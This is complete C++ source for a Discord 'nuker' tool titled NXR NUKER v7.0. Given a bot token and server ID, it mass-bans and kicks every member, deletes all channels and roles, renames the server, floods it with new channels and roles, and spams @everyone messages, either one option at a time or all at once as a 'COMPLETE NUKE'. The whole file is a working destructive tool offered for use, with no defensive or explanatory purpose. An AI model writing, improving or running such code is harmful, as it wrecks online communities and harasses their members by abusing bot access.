#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <iostream>
#include <chrono>
#include <random>
#include <thread>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

std::string g_token, g_guild;
std::mt19937 rng{std::random_device{}()};

void set_color(int c) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), c);
}

void log(const std::string& msg, int color = 12) {
    set_color(color);
    std::cout << msg << std::endl;
    set_color(7);
}

std::string http(const std::string& method, const std::string& endpoint, const std::string& body = "") {
    HINTERNET hInternet = InternetOpenA("NXR/7.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    HINTERNET hConnect = InternetConnectA(hInternet, "discord.com", INTERNET_DEFAULT_HTTPS_PORT,
                                          NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return ""; }

    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION;
    std::string path = "/api/v10" + endpoint;

    HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(), "HTTP/1.1", NULL, NULL, flags, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    std::string headers = "Authorization: Bot " + g_token + "\r\nContent-Type: application/json\r\nUser-Agent: NXR-NUKER/7.0\r\n";

    BOOL ok;
    if (!body.empty())
        ok = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.size(), (LPVOID)body.c_str(), (DWORD)body.size());
    else
        ok = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.size(), NULL, 0);

    std::string resp;
    if (ok) {
        char buf[8192];
        DWORD bytes = 0;
        while (InternetReadFile(hRequest, buf, sizeof(buf)-1, &bytes) && bytes > 0) {
            buf[bytes] = 0;
            resp += buf;
        }
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // faster delay
    std::this_thread::sleep_for(std::chrono::milliseconds(15 + (rng() % 25)));
    return resp;
}

std::vector<std::string> get_ids(const std::string& json) {
    std::vector<std::string> ids;
    size_t pos = 0;
    while ((pos = json.find("\"id\":\"", pos)) != std::string::npos) {
        pos += 6;
        size_t end = json.find('"', pos);
        if (end != std::string::npos) {
            ids.push_back(json.substr(pos, end - pos));
            pos = end + 1;
        } else break;
    }
    return ids;
}

std::string get_username(const std::string& json) {
    size_t pos = json.find("\"username\":\"");
    if (pos == std::string::npos) return "unknown";
    pos += 12;
    size_t end = json.find('"', pos);
    return (end == std::string::npos) ? "unknown" : json.substr(pos, end - pos);
}

void clear() { system("cls"); }

void banner() {
    clear();
    set_color(15);
    std::cout << R"(
    ███╗   ██╗██╗  ██╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
    ████╗  ██║╚██╗██╔╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
    ██╔██╗ ██║ ╚███╔╝ ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
    ██║╚██╗██║ ██╔██╗ ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
    ██║ ╚████║██╔╝ ██╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
)" << std::endl;
    set_color(12);
    std::cout << "\n                    NXR NUKER  v7.0  |  FULL CUSTOM\n";
    std::cout << "                 Live input on every option + Faster\n\n";
    set_color(7);
}

void ban_members() {
    std::string reason;
    std::cout << "Ban reason (example: NXR NUKER): ";
    std::getline(std::cin, reason);
    if (reason.empty()) reason = "NXR NUKER";

    log("[i] Fetching members...", 11);
    std::vector<std::string> members;
    std::string after = "0";
    for (int i = 0; i < 150; ++i) {
        std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
        auto ids = get_ids(resp);
        if (ids.empty()) break;
        members.insert(members.end(), ids.begin(), ids.end());
        after = ids.back();
        std::cout << "\r[i] Loaded " << members.size() << " members" << std::flush;
        if (ids.size() < 100) break;
    }
    std::cout << std::endl;

    log("[!] Banning " + std::to_string(members.size()) + " members...", 12);
    for (size_t i = 0; i < members.size(); ++i) {
        std::string uid = members[i];
        std::string info = http("GET", "/users/" + uid);
        std::string name = get_username(info);
        std::string body = "{\"delete_message_days\":7,\"reason\":\"" + reason + "\"}";
        http("PUT", "/guilds/" + g_guild + "/bans/" + uid, body);
        log("[+] BANNED " + name + " | " + uid, 10);
    }
    log("[+] Ban complete", 10);
}

void kick_members() {
    log("[i] Fetching members...", 11);
    std::vector<std::string> members;
    std::string after = "0";
    for (int i = 0; i < 150; ++i) {
        std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
        auto ids = get_ids(resp);
        if (ids.empty()) break;
        members.insert(members.end(), ids.begin(), ids.end());
        after = ids.back();
        if (ids.size() < 100) break;
    }
    log("[!] Kicking " + std::to_string(members.size()) + " members...", 12);
    for (auto& uid : members) {
        http("DELETE", "/guilds/" + g_guild + "/members/" + uid);
        log("[+] KICKED " + uid, 10);
    }
    log("[+] Kick complete", 10);
}

void delete_channels() {
    log("[i] Fetching channels...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = get_ids(resp);
    log("[!] Deleting " + std::to_string(channels.size()) + " channels...", 12);
    for (auto& id : channels) {
        http("DELETE", "/channels/" + id);
        log("[+] Deleted " + id, 10);
    }
    log("[+] All channels deleted", 10);
}

void delete_roles() {
    log("[i] Fetching roles...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/roles");
    auto roles = get_ids(resp);
    for (auto& id : roles) {
        if (id == g_guild) continue;
        http("DELETE", "/guilds/" + g_guild + "/roles/" + id);
        log("[+] Deleted role " + id, 10);
    }
    log("[+] Roles deleted", 10);
}

void create_channels() {
    std::string prefix;
    int count = 0;
    std::cout << "Channel name prefix (example: nxr-nuke): ";
    std::getline(std::cin, prefix);
    if (prefix.empty()) prefix = "nxr-";
    std::cout << "How many channels to create: ";
    std::cin >> count;
    std::cin.ignore();

    log("[!] Creating " + std::to_string(count) + " channels...", 12);
    for (int i = 0; i < count; ++i) {
        std::string body = "{\"name\":\"" + prefix + std::to_string(i) + "\",\"type\":0}";
        http("POST", "/guilds/" + g_guild + "/channels", body);
        log("[+] Created " + prefix + std::to_string(i), 10);
    }
    log("[+] Channel creation done", 10);
}

void create_roles() {
    std::string prefix;
    int count = 0;
    std::cout << "Role name prefix (example: NXR-ROLE): ";
    std::getline(std::cin, prefix);
    if (prefix.empty()) prefix = "NXR-";
    std::cout << "How many roles to create: ";
    std::cin >> count;
    std::cin.ignore();

    log("[!] Creating " + std::to_string(count) + " roles...", 12);
    for (int i = 0; i < count; ++i) {
        std::string body = "{\"name\":\"" + prefix + std::to_string(i) + "\",\"color\":16711680}";
        http("POST", "/guilds/" + g_guild + "/roles", body);
        log("[+] Created role " + prefix + std::to_string(i), 10);
    }
    log("[+] Role creation done", 10);
}

void rename_server() {
    std::string newname;
    std::cout << "New server name: ";
    std::getline(std::cin, newname);
    if (newname.empty()) newname = "NXR DESTROYED";

    std::string body = "{\"name\":\"" + newname + "\"}";
    http("PATCH", "/guilds/" + g_guild, body);
    log("[+] Server renamed to: " + newname, 10);
}

void spam_channels() {
    std::string msg;
    int count = 0;
    std::cout << "Spam message (type what you want): ";
    std::getline(std::cin, msg);
    if (msg.empty()) msg = "@everyone NXR NUKED";
    std::cout << "How many messages per channel: ";
    std::cin >> count;
    std::cin.ignore();

    log("[i] Fetching channels...", 11);
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = get_ids(resp);

    log("[!] Spamming " + std::to_string(channels.size()) + " channels x" + std::to_string(count), 12);
    for (auto& ch : channels) {
        for (int i = 0; i < count; ++i) {
            std::string body = "{\"content\":\"" + msg + "\"}";
            http("POST", "/channels/" + ch + "/messages", body);
        }
        log("[+] Spam done on " + ch, 10);
    }
    log("[+] All spam finished", 10);
}

void complete_nuke() {
    log("[!] COMPLETE NUKE STARTED", 12);
    rename_server();
    delete_channels();
    delete_roles();
    create_channels();
    create_roles();
    ban_members();
    spam_channels();
    log("[!] COMPLETE NUKE FINISHED", 10);
}

int main() {
    SetConsoleTitleA("NXR NUKER v7.0 - FULL CUSTOM LIVE INPUT");
    system("color 0C");

    banner();
    set_color(15);
    std::cout << "Bot Token : ";
    std::getline(std::cin, g_token);
    std::cout << "Guild ID  : ";
    std::getline(std::cin, g_guild);
    set_color(7);

    // quick check
    std::string test = http("GET", "/guilds/" + g_guild);
    if (test.find("\"id\"") != std::string::npos)
        log("[+] Bot is in the server", 10);
    else
        log("[!] Bot NOT in server / check token & guild ID", 12);

    while (true) {
        banner();
        set_color(12);
        std::cout << "  (1) Ban Members          (live reason)\n";
        std::cout << "  (2) Kick Members\n";
        std::cout << "  (3) Delete All Channels\n";
        std::cout << "  (4) Delete All Roles\n";
        std::cout << "  (5) Create Channels      (live name + count)\n";
        std::cout << "  (6) Create Roles         (live name + count)\n";
        std::cout << "  (7) Rename Server        (live name)\n";
        std::cout << "  (8) Spam All Channels    (live message + count)\n";
        std::cout << "  (9) COMPLETE NUKE\n";
        std::cout << "  (0) Exit\n";
        set_color(7);
        std::cout << "\nSelect option: ";

        int choice;
        std::cin >> choice;
        std::cin.ignore();   // important

        switch (choice) {
            case 1: ban_members(); break;
            case 2: kick_members(); break;
            case 3: delete_channels(); break;
            case 4: delete_roles(); break;
            case 5: create_channels(); break;
            case 6: create_roles(); break;
            case 7: rename_server(); break;
            case 8: spam_channels(); break;
            case 9: complete_nuke(); break;
            case 0: return 0;
            default: log("Invalid option", 12);
        }

        std::cout << "\nPress Enter to return to menu...";
        std::cin.get();
    }
    return 0;
}
